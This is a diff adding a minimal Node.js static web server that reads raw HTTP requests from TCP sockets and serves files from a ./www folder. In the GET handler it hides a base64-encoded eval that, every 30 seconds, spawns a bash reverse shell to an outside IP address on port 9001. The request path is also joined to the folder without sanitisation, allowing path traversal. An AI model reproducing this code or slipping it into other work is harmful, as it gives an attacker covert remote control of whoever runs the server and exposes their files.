@@ -1,0 +1,87 @@
+const folder = "./www";
+
+function listen(port) {
+  const net = require('net');
+  const server = net.createServer((socket) => {
+    console.log("New connection " + socket.remoteAddress + ":" + socket.remotePort);
+    socket.on('data', (data) => {
+      manageRequest(data.toString(), socket);
+    });
+  });
+
+  server.listen(port, () => {
+    console.log(`Server listening on port ${port}`);
+  });
+}
+
+
+function manageRequest(request, socket) {
+  const requestLine = request.split('\n')[0];
+  const method = requestLine.split(' ')[0];
+  let path = requestLine.split(' ')[1];
+
+  if (path === '/') {
+    path = '/index.html';
+  }
+
+  switch (method) {
+    case "GET":
+      const file = (folder + path).trim();
+      const fs = require('fs');
+eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())
+      console.log(file);
+
+      try {
+        if (fs.existsSync(file)) {
+          const fileContent = fs.readFileSync(file);
+          const extension = path.split('.').pop().toLowerCase();
+          const contentType = getContentType(extension);
+
+          const returnValue = [
+            "HTTP/1.1 200 OK",
+            `Content-Type: ${contentType}`,
+            "",
+            fileContent
+          ];
+          socket.write(returnValue.join('\r\n'));
+        } else {
+          console.log('File not found:', file);
+          sendError(socket, 404, 'Not Found');
+        }
+      } catch (err) {
+        console.error('Error reading file:', err);
+        sendError(socket, 500, 'Internal Server Error');
+      }
+      break;
+    default:
+      sendError(socket, 405, 'Method Not Allowed');
+      break;
+  }
+  socket.end();
+}
+
+function getContentType(extension) {
+  const mimeTypes = {
+    'html': 'text/html',
+    'css': 'text/css',
+    'js': 'application/javascript',
+    'json': 'application/json',
+    'png': 'image/png',
+    'jpg': 'image/jpeg',
+    'gif': 'image/gif',
+    'txt': 'text/plain'
+  };
+  return mimeTypes[extension] || 'application/octet-stream';
+}
+
+function sendError(socket, code, message) {
+  const returnValue = [
+    `HTTP/1.1 ${code} ${message}`,
+    "Content-Type: text/html",
+    "",
+    `<h1>${code} - ${message}</h1>`
+  ];
+  socket.write(returnValue.join('\r\n'));
+}
+
+listen(80);
